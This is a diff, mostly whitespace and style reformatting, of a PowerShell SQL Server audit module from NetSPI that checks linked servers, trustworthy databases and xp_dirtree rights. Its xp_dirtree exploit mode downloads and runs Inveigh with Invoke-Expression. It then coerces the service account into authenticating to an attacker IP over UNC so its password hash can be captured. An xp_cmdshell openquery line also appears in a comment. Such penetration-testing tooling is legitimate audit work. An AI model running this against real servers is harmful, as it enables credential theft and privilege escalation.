-                if($LinkUser -and $LinkAccess -eq "True"){
+
+                if($LinkUser -and $LinkAccess -eq 'True')
+                {
                     Write-Verbose -Message "$Instance : - The $LinkName linked server was found configured with the $LinkUser login."
                     $Details = "The SQL Server link $LinkName was found configured with the $LinkUser login."
-                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)                                                                                       
+                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                 }
             }
         }
@@ -9800,30 +9806,30 @@ Function Invoke-SQLAuditPrivServerLink
             Write-Verbose -Message "$Instance : - No exploitable SQL Server links were found."
         }
 
-        # -----------------------------------------------------------------     
-        # Check for exploit dependancies 
+        # -----------------------------------------------------------------
+        # Check for exploit dependancies
         # Note: Typically secondary configs required for dba/os execution
         # -----------------------------------------------------------------
         # $IsExploitable = "No" or $IsExploitable = "Yes"
         # Check if the link is alive and verify connection + check if sysadmin
 
 
-        # -----------------------------------------------------------------    
+        # -----------------------------------------------------------------
         # Exploit Vulnerability
         # Note: Add the current user to sysadmin fixed server role
-        # -----------------------------------------------------------------        
-        # $Exploited = "No" or $Exploited     = "Yes" 
+        # -----------------------------------------------------------------
+        # $Exploited = "No" or $Exploited     = "Yes"
         # select * from openquery("server\intance",'EXEC xp_cmdshell whoami WITH RESULT SETS ((output VARCHAR(MAX)))')
         # Also, recommend link crawler module
-                       
-                   
+
+
         # Status User
-        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Server Link" 
+        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Server Link"
     }
 
     End
-    {   
-        # Return data  
+    {
+        # Return data
         if ( -not $NoOutput)
         {
             Return $TblData
@@ -9842,26 +9848,26 @@ Function Invoke-SQLAuditPrivTrustworthy
             .SYNOPSIS
             Check if any databases have been configured as trustworthy.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
             .PARAMETER Exploit
-            Exploit vulnerable issues.         
+            Exploit vulnerable issues.
             .EXAMPLE
-            PS C:\> Invoke-SQLAuditPrivTrustworthy -Instance SQLServer1\STANDARDDEV2014 
+            PS C:\> Invoke-SQLAuditPrivTrustworthy -Instance SQLServer1\STANDARDDEV2014
 
             ComputerName  : SQLServer1
             Instance      : SQLServer1\STANDARDDEV2014
             Vulnerability : Excessive Privilege - Trustworthy Database
-            Description   : One or more database is configured as trustworthy.  The TRUSTWORTHY database property is used to indicate whether the instance of SQL Server trusts the database 
-            and the contents within it.  Including potentially malicious assemblies with an EXTERNAL_ACCESS or UNSAFE permission setting. Also, potentially malicious modules 
-            that are defined to execute as high privileged users. Combined with other weak configurations it can lead to user impersonation and arbitrary code exection on 
+            Description   : One or more database is configured as trustworthy.  The TRUSTWORTHY database property is used to indicate whether the instance of SQL Server trusts the database
+            and the contents within it.  Including potentially malicious assemblies with an EXTERNAL_ACCESS or UNSAFE permission setting. Also, potentially malicious modules
+            that are defined to execute as high privileged users. Combined with other weak configurations it can lead to user impersonation and arbitrary code exection on
             the server.
-            Remediation   : Configured the affected database so the 'is_trustworthy_on' flag is set to 'false'.  A query similar to 'ALTER DATABASE MyAppsDb SET TRUSTWORTHY ON' is used to 
+            Remediation   : Configured the affected database so the 'is_trustworthy_on' flag is set to 'false'.  A query similar to 'ALTER DATABASE MyAppsDb SET TRUSTWORTHY ON' is used to
             set a database as trustworthy.  A query similar to 'ALTER DATABASE MyAppDb SET TRUSTWORTHY OFF' can be use to unset it.
             Severity      : Low
             IsVulnerable  : Yes
@@ -9872,44 +9878,44 @@ Function Invoke-SQLAuditPrivTrustworthy
             Reference     : https://msdn.microsoft.com/en-us/library/ms187861.aspx
             Author        : Scott Sutherland (@_nullbind), NetSPI 2016
             .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditPrivTrustworthy -Verbose 
+            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditPrivTrustworthy -Verbose
     #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
-        [string]$Instance,       
+        [string]$Instance,
 
         [Parameter(Mandatory = $false,
         HelpMessage = "Don't output anything.")]
         [string]$NoOutput,
-        
+
         [Parameter(Mandatory = $false,
         HelpMessage = 'Exploit vulnerable issues.')]
         [switch]$Exploit
     )
 
     Begin
-    {                 
+    {
         # Table for output
-        $TblData = New-Object -TypeName System.Data.DataTable 
+        $TblData = New-Object -TypeName System.Data.DataTable
         $null = $TblData.Columns.Add('ComputerName')
         $null = $TblData.Columns.Add('Instance')
         $null = $TblData.Columns.Add('Vulnerability')
@@ -9920,15 +9926,15 @@ Function Invoke-SQLAuditPrivTrustworthy
         $null = $TblData.Columns.Add('IsExploitable')
         $null = $TblData.Columns.Add('Exploited')
         $null = $TblData.Columns.Add('ExploitCmd')
-        $null = $TblData.Columns.Add('Details')    
-        $null = $TblData.Columns.Add('Reference')   
-        $null = $TblData.Columns.Add('Author')   
+        $null = $TblData.Columns.Add('Details')
+        $null = $TblData.Columns.Add('Reference')
+        $null = $TblData.Columns.Add('Author')
     }
 
     Process
-    {   
+    {
         # Status User
-        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Trusted Database" 
+        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Trusted Database"
 
         # Test connection to server
         $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
@@ -9938,7 +9944,7 @@ Function Invoke-SQLAuditPrivTrustworthy
         {
             # Status user
             Write-Verbose -Message "$Instance : CONNECTION FAILED."
-            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Trusted Database."           
+            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Trusted Database."
             Return
         }
         else
@@ -9951,9 +9957,9 @@ Function Invoke-SQLAuditPrivTrustworthy
         $CurrentLogin = $ServerInfo.CurrentLogin
         $ComputerName = $ServerInfo.ComputerName
 
-        # --------------------------------------------     
+        # --------------------------------------------
         # Set function meta data for report output
-        # --------------------------------------------  
+        # --------------------------------------------
         if($Exploit)
         {
             $TestMode  = 'Exploit'
@@ -9961,23 +9967,23 @@ Function Invoke-SQLAuditPrivTrustworthy
         else
         {
             $TestMode  = 'Audit'
-        }         
+        }
         $Vulnerability = 'Excessive Privilege - Trustworthy Database'
         $Description   = 'One or more database is configured as trustworthy.  The TRUSTWORTHY database property is used to indicate whether the instance of SQL Server trusts the database and the contents within it.  Including potentially malicious assemblies with an EXTERNAL_ACCESS or UNSAFE permission setting. Also, potentially malicious modules that are defined to execute as high privileged users. Combined with other weak configurations it can lead to user impersonation and arbitrary code exection on the server.'
         $Remediation   = "Configured the affected database so the 'is_trustworthy_on' flag is set to 'false'.  A query similar to 'ALTER DATABASE MyAppsDb SET TRUSTWORTHY ON' is used to set a database as trustworthy.  A query similar to 'ALTER DATABASE MyAppDb SET TRUSTWORTHY OFF' can be use to unset it."
-        $Severity      = 'Low' 
+        $Severity      = 'Low'
         $IsVulnerable  = 'No'
-        $IsExploitable = 'No' 
+        $IsExploitable = 'No'
         $Exploited     = 'No'
         $ExploitCmd    = 'There is not exploit available at this time.'
-        $Details       = ''   
-        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms187861.aspx'       
-        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016' 
-        
-        # -----------------------------------------------------------------     
+        $Details       = ''
+        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms187861.aspx'
+        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'
+
+        # -----------------------------------------------------------------
         # Check for the Vulnerability
         # Note: Typically a missing patch or weak configuration
-        # -----------------------------------------------------------------     
+        # -----------------------------------------------------------------
 
         # Select links configured with static credentials
         $TrustedDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
@@ -9987,14 +9993,14 @@ Function Invoke-SQLAuditPrivTrustworthy
         # Update vulnerable status
         if($TrustedDatabases)
         {
-            $IsVulnerable  = 'Yes'             
-            $TrustedDatabases | 
-            ForEach-Object -Process {                
-                $DatabaseName = $TrustedDatabases.DatabaseName                
-        
+            $IsVulnerable  = 'Yes'
+            $TrustedDatabases |
+            ForEach-Object -Process {
+                $DatabaseName = $TrustedDatabases.DatabaseName
+
                 Write-Verbose -Message "$Instance : - The database $DatabaseName was found configured as trustworthy."
                 $Details = "The database $DatabaseName was found configured as trustworthy."
-                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)                                                                                       
+                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
             }
         }
         else
@@ -10002,30 +10008,30 @@ Function Invoke-SQLAuditPrivTrustworthy
             Write-Verbose -Message "$Instance : - No non-default trusted databases were found."
         }
 
-        # -----------------------------------------------------------------     
-        # Check for exploit dependancies 
+        # -----------------------------------------------------------------
+        # Check for exploit dependancies
         # Note: Typically secondary configs required for dba/os execution
         # -----------------------------------------------------------------
         # $IsExploitable = "No" or $IsExploitable = "Yes"
         # Check if the link is alive and verify connection + check if sysadmin
 
 
-        # -----------------------------------------------------------------    
+        # -----------------------------------------------------------------
         # Exploit Vulnerability
         # Note: Add the current user to sysadmin fixed server role
-        # -----------------------------------------------------------------        
-        # $Exploited = "No" or $Exploited     = "Yes" 
+        # -----------------------------------------------------------------
+        # $Exploited = "No" or $Exploited     = "Yes"
         # select * from openquery("server\intance",'EXEC xp_cmdshell whoami WITH RESULT SETS ((output VARCHAR(MAX)))')
         # Also, recommend link crawler module
-                       
-                   
+
+
         # Status User
-        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Trusted Database" 
+        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Trusted Database"
     }
 
     End
-    {   
-        # Return data  
+    {
+        # Return data
         if ( -not $NoOutput)
         {
             Return $TblData
@@ -10042,74 +10048,74 @@ Function Invoke-SQLAuditPrivXpDirtree
 {
     <#
             .SYNOPSIS
-            Check if the current user has privileges to execute xp_dirtree extended stored procedure.  
-            If exploit option is used, the script will inject a UNC path to the attacker's IP and capture 
+            Check if the current user has privileges to execute xp_dirtree extended stored procedure.
+            If exploit option is used, the script will inject a UNC path to the attacker's IP and capture
             the SQL Server service account password hash using Inveigh.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
             .PARAMETER Exploit
-            Exploit vulnerable issues.  
+            Exploit vulnerable issues.
             .PARAMETER AttackerIp
-            IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.          
+            IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.
             .PARAMETER TimeOut
-            Number of seconds to wait for authentication from target SQL Server.                  
+            Number of seconds to wait for authentication from target SQL Server.
             .EXAMPLE
-            PS C:\> Invoke-SQLAuditPrivXpDirtree -Verbose -Instance SQLServer1\STANDARDDEV2014 -AttackerIp 10.1.1.2 
+            PS C:\> Invoke-SQLAuditPrivXpDirtree -Verbose -Instance SQLServer1\STANDARDDEV2014 -AttackerIp 10.1.1.2
 
             ComputerName  : SQLServer1
             Instance      : SQLServer1\STANDARDDEV2014
             Vulnerability : Excessive Privilege - Execute xp_dirtree
-            Description   : xp_dirtree is a native extended stored procedure that can be executed by members of the Public role by default in SQL Server 2000-2014. Xp_dirtree can be used to force 
-                            the SQL Server service account to authenticate to a remote attacker.  The service account password hash can then be captured + cracked or relayed to gain unauthorized 
-                            access to systems. This also means xp_dirtree can be used to escalate a lower privileged user to sysadmin when a machine or managed account isnt being used.  Thats 
-                            because the SQL Server service account is a member of the sysadmin role in SQL Server 2000-2014, by default.
+            Description   : xp_dirtree is a native extended stored procedure that can be executed by members of the Public role by default in SQL Server 2000-2014. Xp_dirtree can be used to force
+            the SQL Server service account to authenticate to a remote attacker.  The service account password hash can then be captured + cracked or relayed to gain unauthorized
+            access to systems. This also means xp_dirtree can be used to escalate a lower privileged user to sysadmin when a machine or managed account isnt being used.  Thats
+            because the SQL Server service account is a member of the sysadmin role in SQL Server 2000-2014, by default.
             Remediation   : Remove EXECUTE privileges on the XP_DIRTREE procedure for non administrative logins and roles.  Example command: REVOKE EXECUTE ON xp_dirtree to Public
             Severity      : Medium
             IsVulnerable  : Yes
             IsExploitable : Yes
             Exploited     : Yes
             ExploitCmd    : Crack the password hash offline or relay it to another system.
-            Details       : The public principal has EXECUTE privileges on XP_DIRTREE procedure in the master database. Recovered password hash! Hash type = 
-                NetNTLMv1;Hash = SQLSvcAcnt::Domain:0000000000000000400000000000000000000000000000000:1CEC319E75261CEC319E759E7511E1CEC319E753AB7D:
-Reference     : https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/
-Author        : Scott Sutherland (@_nullbind), NetSPI 2016
+            Details       : The public principal has EXECUTE privileges on XP_DIRTREE procedure in the master database. Recovered password hash! Hash type =
+            NetNTLMv1;Hash = SQLSvcAcnt::Domain:0000000000000000400000000000000000000000000000000:1CEC319E75261CEC319E759E7511E1CEC319E753AB7D:
+            Reference     : https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/
+            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
 
             .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain -Verbose | Invoke-SQLAuditPrivXpDirtree -Verbose 
+            PS C:\> Get-SQLInstanceDomain -Verbose | Invoke-SQLAuditPrivXpDirtree -Verbose
     #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
-        [string]$Instance,       
+        [string]$Instance,
 
         [Parameter(Mandatory = $false,
         HelpMessage = "Don't output anything.")]
         [string]$NoOutput,
-        
+
         [Parameter(Mandatory = $false,
         HelpMessage = 'Exploit vulnerable issues.')]
         [switch]$Exploit,
@@ -10124,9 +10130,9 @@ Author        : Scott Sutherland (@_nullbind), NetSPI 2016
     )
 
     Begin
-    {                 
+    {
         # Table for output
-        $TblData = New-Object -TypeName System.Data.DataTable 
+        $TblData = New-Object -TypeName System.Data.DataTable
         $null = $TblData.Columns.Add('ComputerName')
         $null = $TblData.Columns.Add('Instance')
         $null = $TblData.Columns.Add('Vulnerability')
@@ -10137,15 +10143,15 @@ Author        : Scott Sutherland (@_nullbind), NetSPI 2016
         $null = $TblData.Columns.Add('IsExploitable')
         $null = $TblData.Columns.Add('Exploited')
         $null = $TblData.Columns.Add('ExploitCmd')
-        $null = $TblData.Columns.Add('Details')    
-        $null = $TblData.Columns.Add('Reference')   
-        $null = $TblData.Columns.Add('Author')   
+        $null = $TblData.Columns.Add('Details')
+        $null = $TblData.Columns.Add('Reference')
+        $null = $TblData.Columns.Add('Author')
     }
 
     Process
-    {   
+    {
         # Status User
-        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - xp_dirtree" 
+        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - xp_dirtree"
 
         # Test connection to server
         $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
@@ -10155,7 +10161,7 @@ Author        : Scott Sutherland (@_nullbind), NetSPI 2016
         {
             # Status user
             Write-Verbose -Message "$Instance : CONNECTION FAILED."
-            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_dirtree."           
+            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_dirtree."
             Return
         }
         else
@@ -10165,20 +10171,20 @@ Author        : Scott Sutherland (@_nullbind), NetSPI 2016
 
         # Grab server information
         # Grab server, login, and role information
-        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose 
-        $ComputerName = $ServerInfo.ComputerName                
-        $CurrentLogin = $ServerInfo.CurrentLogin        
-        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin  -SuppressVerbose              
+        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+        $ComputerName = $ServerInfo.ComputerName
+        $CurrentLogin = $ServerInfo.CurrentLogin
+        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin  -SuppressVerbose
         $CurrentPrincpalList = @()
-        $CurrentPrincpalList += $CurrentLogin       
+        $CurrentPrincpalList += $CurrentLogin
         $CurrentPrincpalList += 'Public'
         $CurrentLoginRoles | ForEach-Object -Process {
             $CurrentPrincpalList += $_.RolePrincipalName
-        }   
+        }
 
-        # --------------------------------------------     
+        # --------------------------------------------
         # Set function meta data for report output
-        # --------------------------------------------  
+        # --------------------------------------------
         if($Exploit)
         {
             $TestMode  = 'Exploit'
@@ -10186,23 +10192,23 @@ Author        : Scott Sutherland (@_nullbind), NetSPI 2016
         else
         {
             $TestMode  = 'Audit'
-        }         
+        }
         $Vulnerability = 'Excessive Privilege - Execute xp_dirtree'
         $Description   = 'xp_dirtree is a native extended stored procedure that can be executed by members of the Public role by default in SQL Server 2000-2014. Xp_dirtree can be used to force the SQL Server service account to authenticate to a remote attacker.  The service account password hash can then be captured + cracked or relayed to gain unauthorized access to systems. This also means xp_dirtree can be used to escalate a lower privileged user to sysadmin when a machine or managed account isnt being used.  Thats because the SQL Server service account is a member of the sysadmin role in SQL Server 2000-2014, by default.'
         $Remediation   = 'Remove EXECUTE privileges on the XP_DIRTREE procedure for non administrative logins and roles.  Example command: REVOKE EXECUTE ON xp_dirtree to Public'
-        $Severity      = 'Medium' 
+        $Severity      = 'Medium'
         $IsVulnerable  = 'No'
-        $IsExploitable = 'No' 
+        $IsExploitable = 'No'
         $Exploited     = 'No'
         $ExploitCmd    = 'Crack the password hash offline or relay it to another system.'
-        $Details       = ''   
-        $Reference     = 'https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/'       
-        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016' 
-        
-        # -----------------------------------------------------------------     
+        $Details       = ''
+        $Reference     = 'https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/'
+        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'
+
+        # -----------------------------------------------------------------
         # Check for the Vulnerability
         # Note: Typically a missing patch or weak configuration
-        # -----------------------------------------------------------------     
+        # -----------------------------------------------------------------
 
         # Get users and roles that execute xp_dirtree
         $DirTreePrivs = Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName master -SuppressVerbose | Where-Object -FilterScript {
@@ -10213,36 +10219,38 @@ Author        : Scott Sutherland (@_nullbind), NetSPI 2016
         if($DirTreePrivs)
         {
             # Status user
-            Write-Verbose -Message "$Instance : - The $PrincipalName principal has EXECUTE privileges on xp_dirtree."  
+            Write-Verbose -Message "$Instance : - The $PrincipalName principal has EXECUTE privileges on xp_dirtree."
 
-            $IsVulnerable  = 'Yes'             
-            $DirTreePrivs | 
-            ForEach-Object -Process {                
-                $PrincipalName = $DirTreePrivs.PrincipalName                
-        
+            $IsVulnerable  = 'Yes'
+            $DirTreePrivs |
+            ForEach-Object -Process {
+                $PrincipalName = $DirTreePrivs.PrincipalName
+
                 # Check if current login can exploit
                 $CurrentPrincpalList |
-                ForEach-Object -Process { 
+                ForEach-Object -Process {
                     $PrincipalCheck = $_
 
                     if($PrincipalName -eq $PrincipalCheck -or $PrincipalName -eq 'public')
                     {
-                        $IsExploitable  = 'Yes' 
+                        $IsExploitable  = 'Yes'
 
                         # Check if the current process has elevated privs
                         # https://msdn.microsoft.com/en-us/library/system.security.principal.windowsprincipal(v=vs.110).aspx
-                        $CurrentIdentity=[System.Security.Principal.WindowsIdentity]::GetCurrent()
-                        $prp=new-object System.Security.Principal.WindowsPrincipal($CurrentIdentity)
-                        $adm=[System.Security.Principal.WindowsBuiltInRole]::Administrator
-                        $IsAdmin=$prp.IsInRole($adm)
+                        $CurrentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+                        $prp = New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($CurrentIdentity)
+                        $adm = [System.Security.Principal.WindowsBuiltInRole]::Administrator
+                        $IsAdmin = $prp.IsInRole($adm)
                         if (-not $IsAdmin)
-                         {
+                        {
                             Write-Verbose -Message "$Instance : - You do not have Administrator rights. Run this function as an Administrator in order to load Inveigh."
                             $IAMADMIN = 'No'
-                         }else{
+                        }
+                        else
+                        {
                             Write-Verbose -Message "$Instance : - You have Administrator rights. Inveigh will be loaded."
                             $IAMADMIN = 'Yes'
-                         }
+                        }
 
                         # Check for exploit flag
                         if($IAMADMIN -eq 'Yes')
@@ -10255,14 +10263,21 @@ Author        : Scott Sutherland (@_nullbind), NetSPI 2016
                             if(-not $AttackerIp)
                             {
                                 $AttackerIp = (Test-Connection -ComputerName 127.0.0.1 -Count 1 |
-                                Select-Object -ExpandProperty Ipv4Address |
+                                    Select-Object -ExpandProperty Ipv4Address |
                                 Select-Object -Property IPAddressToString -ExpandProperty IPAddressToString)
 
-                                if($AttackerIp -eq "127.0.0.1"){
-                                    $AttackerIp = Get-WmiObject win32_networkadapterconfiguration -filter "ipenabled = 'True'" -ComputerName $env:COMPUTERNAME | 
-                                    Select-Object -First 1 @{Name = "IPAddress";Expression = {[regex]$rx = "(\d{1,3}(\.?)){4}"; $rx.matches($_.IPAddress)[0].Value}} | Select-Object IPaddress -ExpandProperty IPAddress -First 1
+                                if($AttackerIp -eq '127.0.0.1')
+                                {
+                                    $AttackerIp = Get-WmiObject -Class win32_networkadapterconfiguration -Filter "ipenabled = 'True'" -ComputerName $env:COMPUTERNAME |
+                                    Select-Object -First 1 -Property @{
+                                        Name       = 'IPAddress'
+                                        Expression = {
+                                            [regex]$rx = '(\d{1,3}(\.?)){4}'; $rx.matches($_.IPAddress)[0].Value
+                                        }
+                                    } |
+                                    Select-Object -Property IPaddress -ExpandProperty IPAddress -First 1
                                 }
-                             }
+                            }
 
                             # Attempt to load Inveigh via reflection
                             Invoke-Expression -Command (New-Object -TypeName system.net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1')
@@ -10270,29 +10285,29 @@ Author        : Scott Sutherland (@_nullbind), NetSPI 2016
                             $TestIt = Test-Path -Path Function:\Invoke-Inveigh
                             if($TestIt -eq 'True')
                             {
-                                Write-Verbose -Message "$Instance : - Inveigh loaded." 
+                                Write-Verbose -Message "$Instance : - Inveigh loaded."
 
                                 # Get IP of SQL Server instance
-                                $InstanceIP = Resolve-DnsName $ComputerName | Select-Object -Property IPaddress -ExpandProperty ipaddress 
-                                
+                                $InstanceIP = Resolve-DnsName $ComputerName | Select-Object -Property IPaddress -ExpandProperty ipaddress
+
                                 # Start sniffing for hashes from that IP
-                                Write-Verbose -Message "$Instance : - Start sniffing..." 
-                                Invoke-Inveigh -HTTP N -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue -IP $AttackerIp | Out-Null
+                                Write-Verbose -Message "$Instance : - Start sniffing..."
+                                $null = Invoke-Inveigh -HTTP N -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue -IP $AttackerIp
 
 
                                 # Sent unc path to attacker's Ip
                                 Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\path..."
-                                Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_dirtree '\\$AttackerIp\path'" -TimeOut 10 -SuppressVerbose | Out-Null                               
-                                
+                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_dirtree '\\$AttackerIp\path'" -TimeOut 10 -SuppressVerbose
+
                                 # Stop sniffing and print password hashes
                                 Start-Sleep $TimeOut
-                                Stop-Inveigh | Out-Null 
-                                Write-Verbose -Message "$Instance : - Stopped sniffing." 
-                                
+                                $null = Stop-Inveigh
+                                Write-Verbose -Message "$Instance : - Stopped sniffing."
+
                                 $HashType = ''
                                 $Hash = ''
 
-                                [string]$PassCleartext = Get-InveighCleartext 
+                                [string]$PassCleartext = Get-InveighCleartext
                                 if($PassCleartext)
                                 {
                                     $HashType = 'Cleartext'
@@ -10311,66 +10326,66 @@ Author        : Scott Sutherland (@_nullbind), NetSPI 2016
                                 {
                                     $HashType = 'NetNTLMv2'
                                     $Hash = $PassNetNTLMv2
-                                }                                                                       
-                                
+                                }
+
                                 if($Hash)
                                 {
-                                    # Update Status    
-                                    Write-Verbose -Message "$Instance : - Recovered $HashType hash:" 
+                                    # Update Status
+                                    Write-Verbose -Message "$Instance : - Recovered $HashType hash:"
                                     Write-Verbose -Message "$Instance : - $Hash"
-                                    $Exploited = "Yes"
-                                    
-                                    $Details = "The $PrincipalName principal has EXECUTE privileges on the xp_dirtree procedure in the master database. Recovered password hash! Hash type = $HashType;Hash = $Hash" 
+                                    $Exploited = 'Yes'
+
+                                    $Details = "The $PrincipalName principal has EXECUTE privileges on the xp_dirtree procedure in the master database. Recovered password hash! Hash type = $HashType;Hash = $Hash"
                                 }
                                 else
                                 {
-                                    # Update Status    
+                                    # Update Status
                                     $Exploited = 'No'
-                                    $Details = "The $PrincipalName principal has EXECUTE privileges on the xp_dirtree procedure in the master database.  xp_dirtree Executed, but no password hash was recovered."   
-                                }        
-                                
+                                    $Details = "The $PrincipalName principal has EXECUTE privileges on the xp_dirtree procedure in the master database.  xp_dirtree Executed, but no password hash was recovered."
+                                }
+
                                 # Clear inveigh cache
-                                $null = Clear-Inveigh                                          
+                                $null = Clear-Inveigh
                             }
                             else
                             {
-                                Write-Verbose -Message "$Instance : - Inveigh could not be loaded." 
+                                Write-Verbose -Message "$Instance : - Inveigh could not be loaded."
                                 # Update status
                                 $Exploited = 'No'
-                                $Details = "The $PrincipalName principal has EXECUTE privileges on the xp_dirtree procedure in the master database, but Inveigh could not be loaded so no password hashes could be recovered." 
+                                $Details = "The $PrincipalName principal has EXECUTE privileges on the xp_dirtree procedure in the master database, but Inveigh could not be loaded so no password hashes could be recovered."
                             }
                         }
                         else
                         {
                             # Update status
                             $Exploited = 'No'
-                            $Details = "The $PrincipalName principal has EXECUTE privileges on the xp_dirtree procedure in the master database."                            
+                            $Details = "The $PrincipalName principal has EXECUTE privileges on the xp_dirtree procedure in the master database."
                         }
                     }
                     else
                     {
                         # Update status
-                        $IsExploitable  = 'No' 
-                        $Details = "The $PrincipalName principal has EXECUTE privileges the xp_dirtree procedure in the master database."  
+                        $IsExploitable  = 'No'
+                        $Details = "The $PrincipalName principal has EXECUTE privileges the xp_dirtree procedure in the master database."
                     }
                 }
 
-                # Add record                              
-                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)                                                                                       
+                # Add record
